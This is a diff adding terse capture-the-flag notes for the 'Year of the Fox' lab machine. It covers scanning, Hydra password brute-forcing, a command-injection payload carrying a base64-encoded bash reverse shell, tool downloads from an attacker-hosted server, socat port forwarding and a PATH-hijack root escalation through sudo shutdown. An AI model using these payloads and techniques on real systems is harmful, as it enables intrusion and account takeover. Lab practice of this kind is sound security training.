@@ -1,0 +1,100 @@
+[Year of the fox ->Hard]
+nmap -sV -sC 10.10.159.129 -T 4
+[Nmap]
+80/tcp  open  http        Apache httpd 2.4.29
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
+Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX
+Host script results:
+|_clock-skew: mean: -8h00m00s, deviation: 1s, median: -8h00m01s
+|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: year-of-the-fox
+|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
+|   Domain name: lan
+|   FQDN: year-of-the-fox.lan
+|_  System time: 2021-03-06T18:26:27+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-03-06T18:26:27
+|_  start_date: N/A
+[Enum4Linux]
+Sharename       Type      Comment
+---------       ----      -------
+yotf            Disk      Fox's Stuff -- keep out!
+IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
+[Hydra]
+hydra -l rascal -P /media/kali/save/wordlists/rockyou.txt 10.10.159.129 http-head /
+[80 http-head host: 10.10.159.129   login: rascal   password: austria]
+Useful command=>hydra -l fox -P /media/kali/save/wordlists/rockyou.txt  -m <DOMAIN>  smb
+
+[Burpsuite]
+#Command Injection
+{"target":"\" ;whoami\n"}
+{"target":"\" ;id\n"}
+
+[Reverse Shell]
+convert to b64: bash -i >& /dev/tcp/10.4.30.186/4444 0>&1
+{"target":"\" \necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjMwLjE4Ni80NDQ0IDA+JjE= | base64 -d | bash\n"}
+web-flag.txt:THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
+creds2.txt: LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
+UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
+base32 > base64 > c74341b26d29ad41da6cc68feedebd161103776555c21d77e3c2aa36d8c44730
+
+[Privesc]
+kali@kali:sudo python -m SimpleHTTPServer 9090
+$ wget http://10.4.30.186:9090/LinEnum.sh
+[Socat]
+[Port Forward]
+tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -  
+kali@kali:which socat
+/usr/bin/socat
+kali@kali:cd /usr/bin
+kali@kali:sudo python -m SimpleHTTPServer 9090
+$ wget http://10.4.30.186:9090/socat
+$chmod +x socat
+$./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
+[Check using nmap if new_port is open]
+PORT     STATE    SERVICE
+80/tcp   open     http
+139/tcp  open     netbios-ssn
+445/tcp  open     microsoft-ds
+1074/tcp filtered warmspotMgmt
+=>2222/tcp open     EtherNetIP-1
+[Hydra Bforce user Fox]
+hydra -l fox -P /media/kali/save/wordlists/rockyou.txt  ssh://10.10.63.173:2222 -V      
+[2222][ssh] host: 10.10.63.173   login: fox   password: aaron
+User-flag:THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
+#Root
+$fox: sudo -l
+User fox may run the following commands on year-of-the-fox:
+    (root) NOPASSWD: /usr/sbin/shutdown
+fox@year-of-the-fox:~/samba$ cd /tmp
+fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff
+fox@year-of-the-fox:/tmp$ chmod +x /tmp/poweroff
+fox@year-of-the-fox:/tmp$  export PATH=/tmp:$PATH
+fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown 
+root@year-of-the-fox:/tmp# 
+#root@year-of-the-fox:/home/rascal#ls -la
+drwxr-x--- 2 rascal rascal 4096 Jun  1  2020 .                                                                                                                        
+drwxr-xr-x 4 root   root   4096 May 28  2020 ..                                                                                                                       
+lrwxrwxrwx 1 root   root      9 May 28  2020 .bash_history -> /dev/null                                                                                               
+-rw-r--r-- 1 rascal rascal  220 Apr  4  2018 .bash_logout                                                                                                             
+-rw-r--r-- 1 rascal rascal 3771 Apr  4  2018 .bashrc                                                                                                                  
+-r-------- 1 rascal root    158 Jun  9  2020 .did-you-think-I-was-useless.root
+-rw-r--r-- 1 rascal rascal  807 Apr  4  2018 .profile
+
+root@year-of-the-fox:/home/rascal#  cat .did-you-think-I-was-useless.root | tr -d '\n'
+#flag
+[Root:THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}]
+Here's the prize:YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=
+echo "YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=" | base64 -d
+a0274786e2a627078666d6467797046666766683b693232353a6968303
